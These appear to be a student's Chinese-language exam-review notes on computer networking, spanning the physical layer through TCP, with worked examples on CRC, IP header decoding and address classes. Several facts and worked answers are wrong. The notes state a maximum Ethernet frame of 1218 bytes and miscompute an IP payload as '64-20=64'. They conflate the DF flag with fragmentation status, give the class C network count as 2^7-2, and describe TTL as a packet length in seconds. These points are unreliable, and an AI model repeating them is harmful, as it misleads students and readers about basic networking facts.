时延带宽积=传输时延 x 带宽—— 带宽：传输过程中振幅不会明显衰减的频率范围 信息传输速率：b/s，又称比特率 码元传输速率：B\\aud/s，又称波特率 ¶传输定理 【重要考点】 ¶Nyquist定理 Cmax=2Hlog2NC_{max}=2Hlog_2N Cmax​=2Hlog2​N 其中H是带宽，单位是Hz N：离散基数，代表一个信号上面能够储存的比特；比如一次发送两个，N就是222^222 ¶Shannon定理 有噪声信道 C=Hlog2(1+S/N)(bps)C = Hlog_2(1+S/N) (bps) C=Hlog2​(1+S/N)(bps) H: 信道带宽 （Hz） S：信道内所传信号的平均功率 N：信道内部的高斯噪声功率 S/N：信噪比 关键转换公式 (S/N)dB=10log10(S/N)(S/N)_{dB} = 10log_{10}(S/N) (S/N)dB​=10log10​(S/N) 重要例题： 如果在一条长3kHz的信道上发送一个二进制信号，该信道的信噪比为20dB，试问可达到的最大数据率是多少？ 解：(S/N)dB=10log10(S/N)(S/N)_{dB} = 10log_{10}(S/N)(S/N)dB​=10log10​(S/N) Shannon: C=3000 ∗ log2(101) (bps)C = 3000 \\ * \\ log_2(101) \\ (bps) C=3000 ∗ log2​(101) (bps) Nyquist: C=2∗3000∗log22=6000(bps)C = 2 * 3000 *log_22 = 6000 (bps) C=2∗3000∗log2​2=6000(bps) 可得可以达到的最大数据率是6000bps ¶10base-T 考试重点： 10base-T中的T就是双绞线，base是基带信号，10是10Mbps ¶电话系统（telephone system） 电话系统的三种组成部分： 本地回路（local loop） 干线（trunks） 交换局 ¶通道传输 为什么传0和1 ？ 计算机里面存储的是2进制数据 ¶ADSL非对称数字用户线 比标准电话服务具有更多带宽的服务有时称为宽带服务，ADSL就是这些业务当中最流行的一种。 为什么调制解调器那么慢呢？ 因为电话的发明是为了承载人类的语音，整个电话系统都是为了这个目的去优化。所以就具有一定的局限性。 ¶FDM FDM频分多路复用技术：将一条线路的频带逻辑地划分成几个信道，每个用户独立地拥有某些频率段；频率通道之间留有防护频带。 WDM：波分复用技术是FDM应用于光纤通讯时的一个变例； TDM：时分复用技术 一路语音信号：PCM（4k，采样频率8000次/秒） T1线路：24路语音信号通过时分复用技术复用到一条线路上 帧：193位 数据传输速率是：1.544Mbps ¶交换技术 ¶电路交换 就是计算机终端之间通行时，一方发起呼叫，独占一条物理线路，当交换机完成接续，对方收到发气端端信号，双方即可进行通信 在整个通信过程中双方一直占用该电路 实时信强，时延小，交换设备成本低 缺点：线路利用率低，电路接续时间长 适用于传输数据较大，实时性要求较高的场合 ¶报文交换 将用户的报文存在交换机的存储器。当所需要的输出电路空闲时，再将该报文发给接受交换机或终端，它以“存储——转发”方式在网内传输数据 优点：中继电路利用率高，可以 缺点：时延高 适用于传输的数据较小，实时性要求较低的场合； ¶分组交换 实质就是“存储——转发”基础上发展起来的 兼具电路交换和报文交换的优点 采用动态复用技术，传输按照一定长度进行切割后的数据——分组。每个分组标识后，在一条物理线路上采用动态复用的技术，同时传送多个数据分组，把来自用户发端端数据暂存在交换剂的存储器内，接着在网内转发。到达接受端，再去掉分组头将个数据字段按顺序重新装配成完整的报文 ¶异步传输技术 （ATM） 综合业务数字网是集语音、数据、图文传真、可视电话等各种业务为一体的网络、适用于不用等带宽要求和多样的业务要求。 ¶数据链路层 传输单位：帧（Frame） 必考题：成帧技术 ¶基础概念 结点（node）： 网络中的主机（host）和路由器（router） 链路（link）：通信路径上连接相邻结点的通信信道，中间没有任何其他的交换结点。一条链路只是一条通路的一个组成部分。 数据链路：在一根线上传输数据，除了要有一个物理线路外，还有有一些必要的规程来控制这些数据的传输。将实现这些规程的硬件和软件加到链路上，这样就构成了数据链路。 规程：早期的通信协议 数据链路层协议：定义了一个链路的两个结点交换的数据单元格式，以及结点发送和接收数据单元的动作。 适配器都包括了数据链路层和物理层之间的协调 点对点通信（point to point） ：在相邻结点间的一条链路上的通信【数据链路层主要解决的问题】 端到端（end to end）通信：从源结点到目的结点通信。通信路径可能由多个链路组成 ¶提供的服务 ¶无确认无连接 定义：原机器发送独立帧给目标机器（目标机器不对这些帧进行确认） 特点：事先不需要建立逻辑连接，事后也不用释放逻辑连接。若由于线路的噪声而造成某一帧的丢失，数据链路层并不试图去检测这样的丢帧情况。 应用场合：传输速率快，误差率小 ¶有确认无连接服务 定义： 每一帧的发送都会进行单独的确认 应用场景：不靠谱的信道 ¶有确认面向连接的服务 建立连接 进行帧的传送 对连接进行示范 特点： 没有坏帧，没有相同的帧； ¶成帧方法 ¶帧同步 必考题 定义： 以帧为单位进行传送，指出哪里上帧的开始和结束 为什么成帧？ 提高传输效率 差错控制 ¶成帧方法 这个东西是网卡完成的 字符计数法（了解即可） 在帧头中用一个域表示整个帧的字符个数 带字符填充的首尾字符定界法 带位填充的首位标记定届法 必考 方法： 帧的起始和结束都用一个特殊的位串：“01111110”，称为标记（flag），即01111110 - 解决： 0 比特插入删除技术 如何操作： 在连续5个1的右边插入一个0； (a) 0 1 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 0 (b) 0 1 1 0 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 1 0 1 1 1 1 0 0 1 0 考试方法： 给原始数据(a) 写出插入后的数据(b), 给多加上的0加粗 ¶差错控制 产生错误的原因：噪声 错误类型：数据帧出错、数据帧丢失 噪声 错误的检测和纠正 常用编码 奇偶校验、水平垂直奇偶校验 奇偶校验码： 通过增加冗余位来使得码字中“1”带个数保持奇或偶数的编码方法，是一种检错码； 目的：使DL能够向上层提供无差错的服务（链路有干扰） 基本原理： 接受端向发送端发送确认信息（ACK，NAK） ¶流量控制 解决方法： 基于反馈流量控制 基于速率的流量控制 ¶差错检测编码 必考 ¶CRC编码 CRC编码：检纠错能力强大，实现简单，使用广泛 码多项式：将码元序列中的每一位看成是一个多项式的系数，则一个码元序列对应一个多项式，这个多项式被称为该码元序列的多项式。 模2运算：加法不进位，减法不借位，除法中的减法仍然采用模2运算，全都是异或运算； ¶CRC码基本实现 校验和加在帧尾，使带校验和的帧的多项式能被G(x) 除尽；收方接受时，用G(x)去除它，若有余数，则传输错误， ¶校验与计算方法 必考 生成多项式G(x): r次(r+1)高位与低位必须为1 模2除法： “模2除法”与“算术除法”类似，但它既不向上位借位，也不比较除数和被除数的相同位数值的大小，只要以相同位数进行相除即可。模2加法运算为：1+1=0，0+1=1，0+0=0，无进位，也无借位；模2减法运算为：1-1=0，0-1=1，1-0=1，0-0=0，也无进位，无借位。相当于二进制中的逻辑异或运算。也就是比较后，两者对应位相同则结果为“0”，不同则结果为“1”。如100101除以1110，结果得到商为11，余数为1。如果只是想简单的进行计算的话可以记住 在除法的每一个步骤中：按位做异或运算； ¶一些例题 例1：假设选择的CRC生成多项式为 G(X)=x4+x3+1G(X) = x^4 + x^3 + 1G(X)=x4+x3+1，要求出二进制序列10110011的CRC校验码 解： 第一步：将多项式转化为二进制：x4+x3+1x^4 + x^3 + 1x4+x3+1 可以转化为 11001. （多项式只列出二进制值为1的位，也就是这个二进制的第4位、第3位、第0位的二进制均为1，其它位均为0）； 第二步：使用模2除法原则计算CRC校验码；生成的多项式有5位，我们需要在10110011的后面加上4个0来进行计算。 最后我们可以得到CRC校验码为0100； 例2：要发送的数据为1101011011。采用CRC的生成多项式是 P(x)=x4+x+1P(x) = x^4 + x + 1P(x)=x4+x+1。 试求应添加在数据后面的余数。 如果数据在传输过程中最后一个1变成了0，接收端能否发现呢？如果数据在传输过程中最后的两个1都变成了0，接收端能不能发现呢？ ​ ¶基本的数据链路层协议 帧的内容： 帧头和帧数据 ¶无限制的单工协议 两个假设： 链路是理想的传输信道，所传送到任何数据既不会产生丢失也没有差错 不管发送方以多快的速率发送信息，收方总是来得及收下，并及时上交主机 在完全理想化下，数据链路层不需要任何差错控制和流量控制 一个发送方一个接收方 =&gt; 单工 ¶单工停等协议 去掉第二个假设：链路不出错，但是可能出现流量不匹配情况 解决方案 不限时的解决方案，插入一段时延 t，使得接收方有足够的时间来接收或处理 现实的解决方案：让结售汇提供给反馈信息发给发送方 发方：每发一帧，停止下来 收方：每收到一帧，上交网络层，再发一个确认帧（哑帧）给发送方； ack是用来控制发方的速率的，发方只有收到了ack才会发下一个信号； ¶带噪声的单工协议 去掉两个假设, 帧有可能会丢 ¶连续ARQ（自动请求重发）协议 经常考：回退n帧和选择重传的区别 连续ARQ的思想： 对于发送方而言，在发送完一个数据帧后不需要单纯的等待而是继续发送后面的数据帧。如果这时接收到了来着接收方的确认帧，那么还可以继续往下面发送数据帧，如果在超时时间后还没有收到确认帧那就从这一帧开始重发。 对于接收方而言，只需要持续的接受数据帧，当接收到一个坏帧的时候只需要简单的丢弃后面的所有帧就可以了。当成功接收一个数据帧时给发送方一个确认信号。 回退n帧 效率提高，发送端不需要等待确认就可以连续发送 不实用，没有考虑到接受端的处理能力问题 如果发生错误，对效率的影响很大，不适合出错率比较高的信道 选择重传 帧出错之后,对出错帧之后的帧能够接收并且储存在接收缓冲区中； 接收端需要更多的缓存； ¶滑动窗口协议 【 考点】 停止协议和连续A RQ协议的问题； 停止等待协议：发送-停止-等待，效率降低，当传输时间比发送时间大得多时，性能变得不可接受 连续ARQ协议 未经过确认的帧一次传输过多 序号占多位数过多，影响效率，一次能够传输1024帧，10位编号； 实际协议中，一次连续传输的帧的个数时有限的 滑动窗口协议 是停止等待协议和连续ARQ协议的折中：一次连续发送未经确认的帧的个数时有限的； 滑动窗口的特点： 有流量控制 减少了重发的代价 ¶捎带技术 将A-B的数据帧, A-B的确认帧,混合在一起；将B-A的数据帧, B-A的确认帧,混合在一起实际上是在一方收到另外一方发来的数据帧之后,不立即回发确认帧给对方,而是等本站有数据要发送给对方时,将给对方确认信息和本站发向对方的数据混合成一个帧传送给对方。 捎带技术的优点[考点]： 较好的利用信道的带宽 减少目标端的中断次数 减少单独发送确认帧带来的效率上的降低 捎带技术带来的问题以及解决办法[考点] 遇到的问题：如果一个站点在收到对方的数据帧后没有数据发送给对方，源站可能要超时； 解决办法：设置辅助计时器，在目标端接收到数据后，启动辅助计时器，如果辅助计时器到时间了仍然没有数据传送，则单独发送确认帧。 ¶发送窗口 发送窗口的最大值：一次可以连续发送而未经对方确认的帧的个数的最大值 发送缓冲区的个数相当于发送窗口的最大帧的个数（固定值），发送缓冲区中的帧有两类： 未发送的而落入发送缓冲区的帧，可以连续发送出去； 已经发送出去的等待对方确认的帧，发送缓冲区的帧只有得到确认才能删除，窗口向前移动，设置发送缓冲区的目的是使出错的帧可以重发 发送窗口中的序列号代表：在发送缓冲区中已经发送但未确认的帧； 只有收到对方的ack，发送窗口和发送缓冲区后沿向前移动，有更新的帧可以落到发送缓冲区中； Ws=1 滑动窗口协议就是停等协议，Ws非常大；连续ARQ协议； ¶回退n帧协议 问题解决方法： 不是一次发送一个 增加最大发送窗口的数目，： （sending window） 停-等协议信道利用率计算 [考点]已知信息传输速率b(b.s),帧长度是L(bit), 往返时间为：R(s). 忙 L/b （s），空闲R（s）。则利用率为： LL+bR\\frac{L}{L +bR} L+bRL​ 分析 bR: 信道的容量，当信道的容量&gt;L时，利用率将小于50% 当R很短，没有必要增加发送窗口的尺寸，从而增加协议的复杂度； 不适合信道不可靠的情况 回退重选和选择重传的过程对比 回退重传是在超时后从传输错误的帧的编号进行重传 选择重传是只对错误的编号进行重传 选择重传帧编号的意义 接收方告诉发送方没有收到帧 接收方告诉发送方需要重发 [考点] 选择性重传告诉帧编号，最大ws是2n−12^{n-1}2n−1 [考点] 回退n帧告诉帧编号，最大ws是2n−12^n-12n−1 [考点] 对于滑动窗口协议，发送窗口的大小=窗口大小-1 ¶介质访问控制子层 解决信道争用的协议称为介质访问控制协议；MAC（Medium Access Control），时数据链路层协议的一部分。 信道分配方法有两种： 静态分配 动态分配 重点：CSMA，以太网 ¶多路访问协议 ¶CSMA 载波监听： 在示波器上看，有信号就是在使用，没有载波就是信道空闲 1-坚持型CSNA 原理 若站点有数据发送，先监听信道； 若站点发现信道空闲，则发送给； 若信道忙，则继续监听直至发现信道空闲，然后完成发送 若发生冲突，等待一随机事件，然后重新开始发送 优点：减少等待的时间 缺点：增加冲突的概率 非坚持型CSMA 优点：减少冲突概率 缺点：增加了等待概率 p-坚持型CSMA 相当于坚持型和非坚持型的折中方案； 引入原因 当两个帧发生冲突时，两个被损坏帧继续传输毫无意义 【考点】原理 站点使用CSMA协议进行数据发送； 在发送期间如果检测到冲突，立即终止发送，并发出一个瞬间干扰信号，使所有的站点都知道发生了冲突； 在发出干扰信号后，等待一段随机事件，再重复上述过程； ¶无线局域网协议 无线局域网存在的问题： 考点：无限局域网中常遇到的两种问题； 隐藏站点问题 由于站点距离竞争者太远，从而不能发现潜在介质竞争者的问题 A向B发送数据的过程中，C由于收不到A的数据也可以向B发送数据，导致B接收发生冲突； 暴露站问题 由于非竞争者距离发送站点太近，从而导致介质非竞争者不能发送数据的问题称为暴露站点问题 B向A发送数据，被C监听到，导致C不能向D发送数据 隐藏站示意图 暴露站示意图 为什么无限局域网发送数据帧后需要对方必须发回确认帧，而以太网就不需要对方发回确实帧？ 因为无限局域网可能出现检测错误的情况：检测到信道空闲，其实并不空闲，而检测到信道忙，其实并不忙，因此需要接收方发回确认帧来确认信道时候空闲。 ¶以太网 以太网（Ethernet）基于CSMA/CD协议 数据链路层分为MAC子层和LLC子层 ¶曼彻斯特码 【考点】会画曼彻斯特码和差分曼扯斯特码和差分曼彻斯特码的图 0是先低后高，1是先高后低（前一半是底的，后一半是高的） 差分曼彻斯特码是：0变，1不变 (每一个小周期内都要有一个变化，在每个小周期的开头如果下一个小周期是1那么就维持原样不要动，如果下一个小周期是0就变化) 两种编码方式的示意图 ¶以太网MAC子层协议 最小帧长：64字节 最大帧长：1218字节 pad：因为以太网要求有效帧必须至少64字节，从目标地址算起一直到校验和，包括这两个字段本身在内。如果帧的数据部分少于46个字节，则使用填充字段来补充该帧 【考点】问一帧的数据有16字节，还需要填充多少字节？ 因为一个帧的数据部分至少需要46个至少需要需要填充46-16=30个字节； ¶快速以太网 速度：100Mbps 【发送时延】 协议：802.3u标准 千兆以太网： 标准 802.3z ¶中继器，集线器，网桥，交换机，路由器，网关 考点: 每一层有哪些设备，哪些设备在哪一层 各设备在各层中的应用 ¶以太网的MAC帧结构 [考点] 可能会结合后面网络层的知识考你协议分析，务必掌握这个结构； ¶网络层 ¶网络层概述 ISO定义：网络层为一个网络连接的两个传输实体间交换网络服务数据单元提供功能和规程的方法。 网络层是处理端到端的最低层 网络层传输的是IP数据包 要解决的关键问题是了解通行子网的拓扑结构，选择路由 为什么数据链路层不需要路由？ 因为端到端(P to P)的条件是相邻的；其中两者之间的通信是直接连通的； ¶网络的两种实现方式 必考 填空题：网络的两种实现方式是： 数据报和虚电路 数据报：数据报是通过网络传输的数据的基本单元，包含一个报头（header）和数据本身，其中报头描述了数据的目的地以及和其它数据之间的关系。 虚电路：虚电路是分组交换的两种传输方式中的一种。在通信和网络中，虚电路是由分组交换通信所提供的面向连接的通信服务。在两个节点或应用进程之间建立起一个逻辑上的连接或虚电路后，就可以在两个节点之间依次发送每一个分组，接收端收到分组的顺序必然与发送端的发送顺序一致，因此接收端无须负责在接收分组后重新进行排序。虚电路协议向高层协议隐藏了将数据分割成段，包或帧的过程。 简答题：数据包和虚电路的区别[考点]： 都属于分组交换，采用存储转发机制 数据报：每个分组被单独路由，分组带有全网唯一的地址 虚电路：先在源端和目的端之间建立一条虚电路，所有分组沿虚电路按次序存储转发，最后拆除虚电路。在虚电路中，每个分组无须进行路径选择。 虚电路和数据报网络的区别与联系 ¶路由算法 必考题：求拓扑图的最短的路径 给定一个拓扑图求拓扑图中的最短路径：Dijkstra 算法 首先给定一个连通图，假设我们要求D到达任意顶点的最短路径，那么我们需要做的第一步是求出连通图的最小生成树； 最小生成树的生成过程如下； ¶距离矢量路由算法 每年必考的内容 对应例题：P377 第6题. 基本是每年都考 【查表，相加，取最小】 必考IP协议分析题 什么是距离路由矢量？ 每个路由器维护一张表，表中列出了当前已知每个目标最佳距离，以及所使用的链路，这些表通过邻居之间相互之间相互交换信息而不断更新，最终每个路由器都了解到达每个目的地的最短路径。 例：考虑图5-12(a) 中的网络。使用距离矢量路由算法，路由器C刚刚收到下列矢量：来自B(5,0,8,12,6,2)；来自D的(16, 12, 6, 0, 9 ,10)；来自E的(7, 6, 3, 9, 0, 4)。从C到B、D和E的链路成本分别为6、3和5。请给出C的新路由表，包括使用的出镜路线和成本。 解： 解题过程如下图所示： ¶拥塞控制算法 考点：拥塞控制与流量控制的差别： 拥塞控制（congestion control）需要确保通信子网能够承载用户提交的通信量，是一个全局性问题，涉及主机、路由器等很多因素； 流量控制（flow control）与点到点的通信量有关，主要解决快速发送方与慢速接收方的问题，是局部问题，一般都是基于反馈进行控制的。21 ¶IP协议 IP数据包结构 Version: 协议的版本号，比如Version； IHL(ip header length)：表明标头的长度，单位是4字节； Type of service：服务类型，占8bit Total length: 标头以及数据； DF: DF为1时表示不分片 MF: MF为1表示后面还有数据片。也就是说明这个数据片段并不是最后一片。 ttl: time to live，一般一个包的长度最长也就是255秒。 Protocol： TCP是06【10进制】，UDP是17 【10进制】=&gt; 11 注意如果问IHL有多少字节，那么需要把结果乘以4。因为IHL的单位为4字节。IP数据包最长就只能够达到64K。如果一个数据的长度大于64K那么就需要DF、MF和Fragment offset来表示数据的分割。 考点：协议分析； 例1：一个IPv4分组到达一个结点时，其头部信息为0x45 00 00 54 00 03 58 50 20 06 FF F0 7C 4E 03 02 B4 0E 0F 02 (1) 分组的源IP地址和目的IP地址各是什么（点分十进制表示法）？ (2) 该分组数据部分的长度是多少？ (3) 该分组是否已经分片？如果有分片，则偏移量是多少？ 解：首先我们需要知道这一串的数值是16进制的，每一个数据都代表4位，在根据IP数据包的结果就可以得到每一题的结果。 （1）源IP地址从第13个开始：为7C 4E 03 02转化为16进制也就是124.78.3.2。目的IP地址是从第17个开始的：为B4 0E 0F 02也就是180.14.15.2 （2）根据头部信息我们可以知道总长度为0054H = 84D, 头部长度为5*4=20字节。所以数据的长度就是64-20=64字节； （3） 是否分片是根据DF来判断的，DF=1表示不可以分片，DF=0表示可以分片。所以是分片的。片偏移占13位也就是1,1000,0101,0000B=6224D, 单位为8字节，也就是49792字节。 例2：主机A的IP地址为218.207.61.211, MAC地址为00:1d:72:98:1d:fc。A收到一个帧，该帧的前64个字节的十六进制形式和ASCII形式如图所示： （1）主机A所在的网络的网关路由器的相应端口的MAC地址是多少？ （2）该IP分组所携带的数据量为多少字节 （3）如果该分组需要被路由器转发到一条MTU为380字节的链路上，那么路由器将何种操作？ 解：（1）根据以太网帧的结构我们可以知道，00:1d:72:98:1d:fc是目的MAC地址，那么源MAC地址也就是紧挨着的00:00:5e:00:01:01，那么网关路由器的相应端口的MAC地址就是00:00:5e:00:01:01。 （2）主机A的IP地址为218.207.61.211转化为16进制就是：da:cf.3d.d3，我们就可以定位到他所在的位置，往回退14个和13个对应的就是总长度：0190H = 400字节；再往前回退2个就可以得到45其中5为IHL单位为4字节，IHL总长度为20字节。数据长度为：400-20 = 380字节 （3）由于IP字段的总长度为400字节，超出了MTU为380字节的限制。这个时候需要考虑分片，但是是否能够分片还要看IP的标志位DF，DF=1不能分片，DF=0可以分片。根据IP首部信息我们可以得到标志位对应的16进制数为40H=01000000B, 则可得DF=1，不能对该IP分组进行分片，那么路由器应该进行的操作就是丢弃该分组，并用ICMP差错报文像源主机报告； ¶IP地址 1.掌握给出一个ip地址，能指出是哪类地址 2.ip地址的构成 3.每类地址最大网络数和最大主机数 判断方法：看第一个0前有几个1 只考：a,b,c类 [考点] 综合考题形式(必考题)：先问ip是多少，再问ip属于什么类型（将开头第一个数字化为二进制看看属于哪个分类） 例1：分析136.17.18.5的类别，给出他的网络号，主机号； 将136化为二进制: 10001000，所以属于B类。 再查看B类的结构知：前16位位网络号（Network）后16位为主机号（Host） 网络号：136.17 主机号：18.5 例2：分析200.3.4.5的类别，给出他的网络号，主机号； 将200转化为二进制：11001000, 所以属于C类； 再看C类的结构可以知道：前24位为网络号，后8位为主机号； 网络号：200.3.4 主机号：5 [考点] 每类地址最大网络数和最大主机数 求法： 最大网络数=2^(Network所占位数)-2 最大主机数=2^(Host所占位数)-2 解释：-2的原因是除去全0和全1两种地址 A类：最大网络数=27−22^7-227−2 B类：最大网络数=214−22^{14}-2214−2 C类：最大网络数=27−22^7-227−2 ¶子网（暂时没讲，自学，如果要考老师会再提） ¶NAT（老师叫我们上网自己查） 概述：NAT英文全称是“Network Address Translation”，中文意思是“网络地址转换”，它是一个IETF(Internet Engineering Task Force, Internet工程任务组)标准，允许一个整体机构以一个公用IP（Internet Protocol）地址出现在Internet上。顾名思义，它是一种把内部私有网络地址（IP地址）翻译成合法网络IP地址的技术。因此我们可以认为，NAT在一定程度上，能够有效的解决公网地址不足的问题。 P347 Three ranges of IP addresses have been declared as private： 10.0.0.0 – 10.255.255.255/8 (16,777,216 hosts) 172.16.0.0 – 172.31.255.255/12 (1,048,576 hosts) 192.168.0.0 – 192.168.255.255/16 (65,536 hosts) NAT的工作原理：==当私有网主机和公共网主机通信的IP包经过NAT网关时，将IP包中的源IP或目的IP在私有IP和NAT的公共IP之间进行转换。== 以下是补充： NAT主要可以实现以下几个功能：数据包伪装、平衡负载、端口转发和透明代理。 数据伪装: 可以将内网数据包中的地址信息更改成统一的对外地址信息，不让内网主机直接暴露在因特网上，保证内网主机的安全。同时，该功能也常用来实现共享上网。 端口转发: 当内网主机对外提供服务时，由于使用的是内部私有IP地址，外网无法直接访问。因此，需要在网关上进行端口转发，将特定服务的数据包转发给内网主机。 负载平衡: 目的地址转换NAT可以重定向一些服务器的连接到其他随机选定的服务器。（不是很明白） 失效终结: 目的地址转换NAT可以用来提供高可靠性的服务。如果一个系统有一台通过路由器访问的关键服务器，一旦路由器检测到该服务器当机，它可以使用目的地址转换NAT透明的把连接转移到一个备份服务器上。（如何转移的?） 透明代理: NAT可以把连接到因特网的HTTP连接重定向到一个指定的HTTP代理服务器以缓存数据和过滤请求。一些因特网服务提供商就使用这种技术来减少带宽的使用而不用让他们的客户配置他们的浏览器支持代理连接。（如何重定向的?） ¶Internet控制协议 除了用于数据传输协议的IP协议外，Internet在网络层还有几个辅助控制协议。他们包括ICMP协议、ARP协议、DHCP协议 ICMP ICMP和IP的关系: ICMP使用IP协议传输ICMP报文，ICMP报文被封装在IP数据报中； ICMP协议和IP协议同处于一个互联网层 ICMP报文的格式: ARP 必考 ：arp属于哪一层（网络层）将什么以什么形式传给对方（将本机IP地址和MAC地址以ARP应答的方式传给对方） DL层是不理解IP地址的，它只能够按照MAC地址来发送和接收帧 IP层将IP分组交给DL层，同时还应该给出该目标IP地址所对应的MAC地址，只有这样DL层才能够顺利地将IP分组封装成帧传送出去 如何进行IP地址和MAC地址的翻译—ARP ARP的目的： 已知IP地址，求该IP地址对应的MAC地址 转换过程 ： LAN内部广播发送ARP请求分组，有待求的IP地址 目标站收到该请求，回答，将本机IP地址和MAC地址以ARP应答的方式传给对方 改进1：ARP高速缓存的应用；将已知道的IP地址-MAC地址对，记在ARP高速缓存，下次使用时无须再问 剩余改进见ppt 数据传输过程： 发送以前，由APR协议获知目标IP对应的MAC地址； 主机将数据报和MAC地址通过IP层和DL层的接口交给DL层，DL将IP数据报加上DL头和尾，形成DL帧发出去； ¶传输层 传输层就两个协议：TCP和UDP ¶传输层概述 从通信和信息处理的角度看，传输层向它上面的应用层提供通信服务，它属于面向通信部分的最高层，同时也是用户功能中的最低层。 ¶传输服务 引入传输层的原因： 消除网络层的不可靠性； 提供从源端主机到目的端主机的可靠的、与实际使用的网络无关的信息传输。 传输服务： 传输实体（transport entity）：完成传输层功能的硬软件； 传输层实体利用网络层提供的服务向高层提供有效、可靠的服务； 传输层提供两种服务 面向连接的传输服务：连接建立，数据传输，连接释放； 无连接的传输服务。 1 ~ 4层称为传输服务提供者（transport service provider），4层以上称为传输服务用户（transport service user）。 传输层协议和网络层协议的主要区别： ¶端口(port) ==端口==就是传输层服务访问点 TSAP。 ==端口的作用==:就是让应用层的各种应用进程都能将其数据通过端口向下交付给传输层，以及让传输层知道应当将其报文段中的数据向上通过端口交付给应用层相应的进程。从这个意义上讲，端口是用来标志应用层的进程。 端口用一个 16 bit 端口号进行标志。端口号只具有本地意义，即端口号只是为了标志本计算机应用层中的各进程。在因特网中不同计算机的相同端口号是没有联系的。 两类端口：一类是熟知端口(well-known ports)，其数值一般为 0~1023。如： Web HTTP: 80，File FTP: 21，Email SMTP: 25等等。当一种新的应用程序出现时，必须为它指派一个熟知端口。 另一类则是一般端口1024~65535，用来随时分配给请求通信的客户进程。 ¶套接字 ¶Client/Server客户服务器方式 TCP和UDP 的连接和建立都是采用客户服务器方式。 主动发起连接建立的应用进程叫做客户(client)。 被动等待连接建立的应用进程叫做服务器(server)。 ¶传输协议 ¶UDP协议 UDP 只在 IP 的数据报服务之上增加了很少一点的功能，即端口的功能和差错检测的功能。 虽然 UDP 用户数据报只能提供不可靠的交付，但 UDP 在某些方面有其特殊的优点。 发送数据之前不需要建立连接 UDP 的主机不需要维持复杂的连接状态表。 UDP 用户数据报只有8个字节的首部开销。 网络出现的拥塞不会使源主机的发送速率降低。这对某些实时应用是很重要的。 UDP用户数据报的首部格式 ¶TCP TCP 协议是面向字节的。TCP 将所要传送的报文看成是字节组成的数据流，并使每一个字节对应于一个序号。 在连接建立时，双方要商定初始序号。TCP 每次发送的报文段的首部中的序号字段数值表示该报文段中的数据部分的第一个字节的序号。 TCP 的确认是对接收到的数据的最高序号表示确认。接收端返回的确认号是已收到的数据的最高序号加 1。因此确认号表示接收端期望下次收到的数据中的第一个数据字节的序号。 分配的端口号： 重点！TCP 的数据编号与确认，一定要会分析！ 源端口和目的端口字段——各占 2 字节。端口是运输层与应用层的服务接口。运输层的复用和分用功能都要通过端口才能实现。 序号字段(SEQ)——占 4 字节。TCP 连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。 确认号字段(ACK)——占 4 字节，是期望收到对方的**下一个**报文段的数据的第一个字节的序号。 TCP头长度——占 4 bit，它指出 TCP 头部包含多少个32bit的字。（也指明了报文段的数据起始处距离 TCP 报文段的起始处有多远。“TCP头长度”的单位不是字节而是 32 bit 字（4 字节为计算单位）也就是说一定要将字节化为字，即乘4，考试一定要写单位不然会扣分。 12例题：收到tcp头为0110,则其头长度为6*4，即24bit 保留字段——占 6 bit，保留为今后使用，但目前应置为 0。 紧急比特 URG —— 当 URG = 1 时，表明紧急指针字段有效。它告诉系统此报文段中有紧急数据，应尽快传送(相当于高优先级的数据)。 确认比特 ACK —— 只有当 ACK =1 时确认号字段才有效。当 ACK = 0 时，确认号无效。 推送比特 PSH (PuSH) —— 接收 TCP 收到推送比特置 1 的报文段，就尽快地交付给接收应用进程，而不再等到整个缓存都填满了后再向上交付。 复位比特 RST (ReSeT) —— 当 RST  1 时，表明 TCP 连接中出现严重差错（如由于主机崩溃或其他原因），必须释放连接，然后再重新建立运输连接。 同步比特 SYN —— 同步比特 SYN 置为 1，就表示这是一个连接请求或连接接受报文。 终止比特 FIN (FINal) —— 用来释放一个连接。当FIN  1 时，表明此报文段的发送端的数据已发送完毕，并要求释放运输连接。 窗口字段(WIN) —— 占 2 字节。窗口字段用来控制对方发送的数据量，单位为字节。TCP 连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。 检验和 —— 占 2 字节。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。 紧急指针字段 —— 占 16 bit。紧急指针指出在本报文段中的紧急数据的最后一个字节的位置。 选项字段 —— 长度可变。TCP 只规定了一种选项，即最大报文段长度 MSS (Maximum Segment Size)。MSS 告诉对方 TCP：“我的缓存所能接收的报文段的数据字段的最大长度是 MSS 个字节。” 填充字段 —— 这是为了使整个首部长度是 4 字节的整数倍。 ¶三次握手建立TCP连接 第二行的含义：x+1之前的报文全部接受；下一次发的序列号是x+1 SEQ:发送的数据包 考点：会在图中挖空，以填空的方式考察。需要我们完全掌握掌握这个图 符号说明： 序列号：SEQ：用来标记数据段的顺序 确认号：ack：期待收到对方的下一个报文段的第一个数据字节序号 确认ACK：当ACK=1时，确认字段才有效，否则确认字段没有效 同步SYN：连接建立时用于同步序号 SYN=1，ACK=0 --&gt; 连接请求报文 SYN=1, ACK=1 --&gt; 同意连接 终止FIN：用来释放一个连接，FIN=1表示数据发送完毕，请求释放连接； 第一次握手：客户端将标志位SYN置为1，随机产生一个值SQL=x，并将数据包发送给服务器端，等待服务器的确认； 第二次握手：服务器端收到数据包后，由标志位SYN=1知道客户端要请求连接，服务器将标志位SYN和ACK都置为1，ack=x+1，随机产生一个SEQ=有，并将该数据包发送给客户端以请求确认 第三次握手：客户端收到确认后，检测ack时候为x+1，ACK是否为1，如果正确则将标志位ACK置为1，ack=y+1，并将该数据包发送给服务器，服务器检查ack是否为y+1，ACK是否为1，如果正确则连接建立成功； ¶TCP传输策略 掌握这个图： 解释： SEQ:是数据包中第一个编号 2K：地址0-2047，因为从0开始 ACK=2048，因为ACK指向下一个文段的数据的第一个字节的序号 WIN：还可以发多少给我，例如：WIN=2k，表示还可以发2k 考试题型： 传输过程中该填什么？（以上图为例，最后一次右边到左边发送什么？） 答：ACK=4096+1023+1 WIN=1k ¶TCP拥塞控制 [考点] （1） 慢开始算法： 在TCP刚刚连接好，开始发送TCP报文的时候，先让拥塞窗口cwnd=1，即一个最大报文段长度MSS。而在每收到一个对新的报文段的确认后，将cwnd加1，即增大一个MSS。用这样的方法逐步增大发送方的拥塞窗口cwnd，可以使得分组注入到网络的速率更加合理。 